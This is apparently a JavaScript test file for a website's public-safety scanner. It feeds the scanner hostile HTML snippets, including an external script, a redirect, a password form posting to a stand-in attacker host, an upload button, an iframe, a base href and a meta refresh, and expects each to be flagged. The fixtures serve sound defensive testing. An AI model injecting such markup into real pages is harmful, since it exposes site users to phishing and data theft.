import {test} from "node:test";
import assert from "node:assert/strict";
import {auditPage,auditStaticPreview,publicPages} from "../tools/audit-public-safety.mjs";

test("public preview pages use first-party scripts and no password collection",async()=>{
 const reports=await auditStaticPreview();
 assert.equal(reports.length,publicPages.length+4);
 assert.deepEqual(reports.flatMap(r=>r.faults||[]),[],JSON.stringify(reports));
});
test("security scanner rejects untrusted executable sources and embedded credential prompts",()=>{
 for(const html of [
  '<script src="https://malicious.invalid/phish.js"></script>',
  '<script>window.location="https://malicious.invalid"</script>',
  '<form action="https://malicious.invalid/login"><input type="password"></form>',
  '<button formaction="//malicious.invalid/upload">Submit</button>',
  '<iframe src="https://malicious.invalid"></iframe>',
  '<base href="https://malicious.invalid/">',
  '<meta http-equiv="refresh" content="0;url=https://malicious.invalid">'
 ])assert.ok(auditPage("test.html",html).faults.length>0,html);
});
test("security scanner accepts required local scripts and regular data capture forms",()=>{
 const safe='<script type="module" src="../assets/site-shell.js"></script><form id="inventory-form"><input type="text" name="sku"></form>';
 assert.deepEqual(auditPage("safe.html",safe).faults,[]);
});
